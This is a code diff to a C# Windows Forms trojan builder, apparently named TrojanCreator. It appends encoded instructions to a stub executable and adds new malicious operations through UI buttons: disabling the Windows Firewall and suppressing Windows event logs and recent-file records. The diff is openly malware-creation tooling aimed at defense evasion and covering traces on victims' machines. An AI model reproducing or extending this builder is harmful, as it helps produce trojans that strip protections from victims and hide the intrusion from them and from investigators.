@@ -263,7 +263,7 @@ public partial class MainForm : MetroForm
 
             if (saveFileDialog2.ShowDialog().Equals(DialogResult.OK))
             {
-                byte[] currentBytes = System.IO.File.ReadAllBytes(@"C:\Users\gabry\Desktop\Computer\Developing\Progetti\TrojanCreator\Stub\bin\Release\Stub.exe");
+                byte[] currentBytes = System.IO.File.ReadAllBytes(@"C:\Users\gabry\Desktop\Computer\Developing\Progetti\GabryB03 GitHub\Repositories\TrojanCreator\Stub\bin\Release\Stub.exe");
                 currentBytes = Combine(currentBytes, Encoding.UTF8.GetBytes("|TROJAN_CREATOR_SPLITTED|"));
                 bool initialized = false;
 
@@ -403,6 +403,24 @@ public partial class MainForm : MetroForm
                     else if (name == "Swap Mouse Buttons")
                     {
                         operationType = 22;
+                        newBytes = BitConverter.GetBytes(operationType);
+                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
+                    }
+                    else if (name == "Windows Firewall")
+                    {
+                        operationType = 23;
+                        newBytes = BitConverter.GetBytes(operationType);
+                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
+                    }
+                    else if (name == "Anti Windows Event Logs")
+                    {
+                        operationType = 24;
+                        newBytes = BitConverter.GetBytes(operationType);
+                        newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
+                    }
+                    else if (name == "Anti Windows Recent Files")
+                    {
+                        operationType = 25;
                         newBytes = BitConverter.GetBytes(operationType);
                         newBytes = Combine(newBytes, FillProperties(theDetails, new string[] { "Action" }));
                     }
@@ -899,6 +917,72 @@ public partial class MainForm : MetroForm
             Name = "Swap Mouse Buttons",
             Details =
                 "[Action] = \"Unswap\""
+        });
+        RefreshListBox();
+    }
+
+    private void gunaButton47_Click(object sender, EventArgs e)
+    {
+        Utils.instructions.Add(new TrojanInstruction()
+        {
+            Name = "Windows Firewall",
+            Details =
+                "[Action] = \"Disable\""
+        });
+        RefreshListBox();
+    }
+
+    private void gunaButton48_Click(object sender, EventArgs e)
+    {
+        Utils.instructions.Add(new TrojanInstruction()
+        {
+            Name = "Windows Firewall",
+            Details =
+                "[Action] = \"Enable\""
+        });
+        RefreshListBox();
+    }
+
+    private void gunaButton50_Click(object sender, EventArgs e)
+    {
+        Utils.instructions.Add(new TrojanInstruction()
+        {
+            Name = "Anti Windows Event Logs",
+            Details =
+                "[Action] = \"Start\""
+        });
+        RefreshListBox();
+    }
+
+    private void gunaButton49_Click(object sender, EventArgs e)
+    {
+        Utils.instructions.Add(new TrojanInstruction()
+        {
+            Name = "Anti Windows Event Logs",
+            Details =
+                "[Action] = \"Stop\""
+        });
+        RefreshListBox();
+    }
+
+    private void gunaButton52_Click(object sender, EventArgs e)
+    {
+        Utils.instructions.Add(new TrojanInstruction()
+        {
+            Name = "Anti Windows Recent Files",
+            Details =
+                "[Action] = \"Start\""
+        });
+        RefreshListBox();
+    }
+
+    private void gunaButton51_Click(object sender, EventArgs e)
+    {
+        Utils.instructions.Add(new TrojanInstruction()
+        {
+            Name = "Anti Windows Recent Files",
+            Details =
+                "[Action] = \"Stop\""
         });
         RefreshListBox();
     }
